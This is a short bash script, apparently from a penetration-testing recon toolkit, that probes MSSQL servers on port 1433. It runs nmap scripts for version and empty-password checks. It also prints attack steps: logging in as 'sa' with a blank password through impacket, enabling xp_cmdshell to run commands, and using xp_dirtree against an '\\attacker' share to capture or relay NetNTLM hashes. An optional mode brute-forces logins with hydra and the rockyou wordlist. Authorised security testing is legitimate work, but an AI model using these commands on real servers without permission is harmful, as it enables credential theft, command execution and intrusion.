#!/usr/bin/env bash
# recce-service: MSSQL (1433) - instance info, blank sa, xp_cmdshell path
. "$(cd "$(dirname "$0")/.." && pwd)/lib.sh"
T="$1"; P="${2:-1433}"; [ "$3" = "-a" ] && AGGR=1
svc_start "MSSQL" "$T" "$P"

nse "$T" "$P" "ms-sql-info,ms-sql-ntlm-info,ms-sql-empty-password,ms-sql-config"
note "version -> patch level; NTLM info leaks hostname/domain for relay & spraying"
find_ "If you get any SQL login: xp_cmdshell / xp_dirtree (SMB coerce) -> often SYSTEM"
note "impacket:   impacket-mssqlclient <user>:<pass>@$T -windows-auth"
note "blank sa:   impacket-mssqlclient sa:@$T   then  enable_xp_cmdshell; xp_cmdshell whoami"
note "no creds, SQL reachable -> UNC path injection (xp_dirtree \\\\attacker\\x) to capture/relay the service NetNTLM"

if aggr; then sec "MSSQL login brute (intrusive)"; need hydra && run hydra -L users.txt -P /usr/share/wordlists/rockyou.txt -f "mssql://$T:$P"
else skip_aggr "hydra mssql brute (needs users.txt)"; fi
